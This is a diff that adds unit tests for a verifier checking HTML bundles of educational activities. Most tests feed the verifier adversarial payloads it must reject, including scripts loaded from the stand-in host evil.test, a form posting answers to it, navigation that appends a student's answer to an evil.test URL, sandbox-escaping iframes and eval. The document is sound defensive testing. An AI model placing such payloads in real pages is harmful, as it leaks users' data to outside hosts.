@@ -8,6 +8,7 @@ import {
   authorizeActivityTelemetryMessage,
   buildActivitySessionContext,
   createActivityArtifactCandidates,
+  createUnguessableBundleRef,
   resolveApprovedActivityForBand,
   verifyActivityArtifact,
 } from "./server.js";
@@ -80,6 +81,129 @@ describe("activity artifact contracts", () => {
       expect(inlineScript).toBeDefined();
       expect(() => new Function(inlineScript ?? "")).not.toThrow();
     }
+  });
+
+  it("creates cryptographically unguessable bundle references", () => {
+    const first = createUnguessableBundleRef("static");
+    const second = createUnguessableBundleRef("static");
+
+    expect(first).toMatch(
+      /^artifact-bundles\/static\/[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}\/index\.html$/,
+    );
+    expect(second).not.toBe(first);
+  });
+
+  it.each([
+    ["script injection", "<script src='https://evil.test/payload.js'></script>", "external or executable URL references are forbidden"],
+    ["unsafe event handler", "<button onclick='window.top.location=`https://evil.test`'>Salir</button>", "inline event handlers are forbidden"],
+    ["named link target", "<a href='#done' target='activityReport'>Informe</a>", "navigation targets are forbidden"],
+    ["external network reference", "<img src='https://evil.test/tracker.png'>", "external or executable URL references are forbidden"],
+    ["root-relative subresource", "<img src='/activity.js'>", "external or executable URL references are forbidden"],
+    ["dot-relative subresource", "<script src='./main.js'></script>", "external or executable URL references are forbidden"],
+    ["empty executable source", "<script src=''></script>", "external or executable URL references are forbidden"],
+    ["fragment executable source", "<script src='#stub'></script>", "external or executable URL references are forbidden"],
+    ["relative poster", "<video poster='asset.png'></video>", "external or executable URL references are forbidden"],
+    ["relative srcset candidate", "<img srcset='asset.png 1x'>", "external or executable URL references are forbidden"],
+    ["style import", "<style>@import './theme.css';</style>", "CSS URL references are forbidden"],
+    ["style URL", "<style>body { background: url(asset.png); }</style>", "CSS URL references are forbidden"],
+    ["SVG filter URL", "<svg><rect filter='url(./filters.svg#blur)'></rect></svg>", "SVG URL references are forbidden"],
+    ["external SVG sprite", "<svg><use xlink:href='./sprite.svg#icon'></use></svg>", "external or executable URL references are forbidden"],
+    ["eval", "<script>eval('reportComplete()')</script>", "eval is forbidden"],
+    ["Function constructor", "<script>new Function('reportComplete()')()</script>", "Function constructor is forbidden"],
+    ["artifact CSP", "<meta http-equiv='Content-Security-Policy' content=\"script-src 'none'\">", "artifact-controlled CSP meta tags are forbidden"],
+    ["data script URL", "<script src='data:text/javascript,alert(1)'></script>", "external or executable URL references are forbidden"],
+    ["form submission", "<form action='https://evil.test/collect'><input name='answer'></form>", "forms are forbidden"],
+    ["storage access", "<script>localStorage.setItem('answer', 'secret')</script>", "localStorage is forbidden"],
+    ["layout replacement", "<script>document.write('<main>replacement</main>')</script>", "document.write is forbidden"],
+    ["writeln replacement", "<script>document.writeln('<main>replacement</main>')</script>", "document.write is forbidden"],
+    ["bracketed document replacement", "<script>document['writeln']('<main>replacement</main>')</script>", "document.write is forbidden"],
+    ["sandbox escape", "<iframe sandbox='allow-same-origin allow-top-navigation' srcdoc='<p>escape</p>'></iframe>", "nested browsing contexts are forbidden"],
+    ["template descendants", "<template><iframe srcdoc='<p>escape</p>'></iframe></template>", "nested browsing contexts are forbidden"],
+    ["script markup string", "<script>document.body.insertAdjacentHTML('beforeend', '<iframe srcdoc=\"<p>escape</p>\"></iframe>')</script>", "nested browsing contexts are forbidden"],
+    ["meta navigation", "<meta http-equiv='refresh' content='0;url=https://evil.test'>", "meta refresh is forbidden"],
+    ["self navigation", "<script>location.href = 'https' + '://evil.test/?a=' + answer</script>", "self-navigation is forbidden"],
+    ["window navigation", "<script>window['location'].assign('/replacement')</script>", "self-navigation is forbidden"],
+    ["indirect self navigation", "<script>document.defaultView.location = 'https' + '://evil.test/?a=' + answer</script>", "self-navigation is forbidden"],
+  ])("rejects adversarial %s artifacts with a specific reason", (_name, payload, reason) => {
+    const context = buildActivitySessionContext([lessonState]);
+    const [candidate] = createActivityArtifactCandidates({
+      lessonState,
+      sessionContext: context,
+      curriculumMatches,
+      activitySetId: "set-security",
+    });
+    candidate.bundle_html = candidate.bundle_html.replace("</body>", `${payload}</body>`);
+
+    const result = verifyActivityArtifact(candidate);
+
+    expect(result.ok).toBe(false);
+    expect(result.errors).toContain(reason);
+  });
+
+  it("allows data URLs for inline assets", () => {
+    const context = buildActivitySessionContext([lessonState]);
+    const [candidate] = createActivityArtifactCandidates({
+      lessonState,
+      sessionContext: context,
+      curriculumMatches,
+      activitySetId: "set-data-url",
+    });
+    candidate.bundle_html = candidate.bundle_html.replace(
+      "</body>",
+      '<img src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=" srcset="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs= 1x" alt="Punto"> </body>',
+    );
+
+    expect(verifyActivityArtifact(candidate).ok).toBe(true);
+  });
+
+  it("allows local SVG presentation references", () => {
+    const context = buildActivitySessionContext([lessonState]);
+    const [candidate] = createActivityArtifactCandidates({
+      lessonState,
+      sessionContext: context,
+      curriculumMatches,
+      activitySetId: "set-svg-fragment",
+    });
+    candidate.bundle_html = candidate.bundle_html.replace(
+      "</body>",
+      '<svg><defs><filter id="blur"></filter></defs><rect filter="url(#blur)"></rect></svg></body>',
+    );
+
+    expect(verifyActivityArtifact(candidate).ok).toBe(true);
+  });
+
+  it("allows local legacy SVG sprite references", () => {
+    const context = buildActivitySessionContext([lessonState]);
+    const [candidate] = createActivityArtifactCandidates({
+      lessonState,
+      sessionContext: context,
+      curriculumMatches,
+      activitySetId: "set-svg-sprite",
+    });
+    candidate.bundle_html = candidate.bundle_html.replace(
+      "</body>",
+      '<svg><symbol id="icon"><circle r="4"></circle></symbol><use xlink:href="#icon"></use></svg></body>',
+    );
+
+    expect(verifyActivityArtifact(candidate).ok).toBe(true);
+  });
+
+  it("rejects relative srcset candidates after an allowed data URL", () => {
+    const context = buildActivitySessionContext([lessonState]);
+    const [candidate] = createActivityArtifactCandidates({
+      lessonState,
+      sessionContext: context,
+      curriculumMatches,
+      activitySetId: "set-srcset",
+    });
+    candidate.bundle_html = candidate.bundle_html.replace(
+      "</body>",
+      '<img srcset="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=, asset.png 2x" alt="Punto"> </body>',
+    );
+
+    const result = verifyActivityArtifact(candidate);
+    expect(result.ok).toBe(false);
+    expect(result.errors).toContain("external or executable URL references are forbidden");
   });
 
   it("renders an order interaction when the shared plan uses a sequence mechanic", () => {
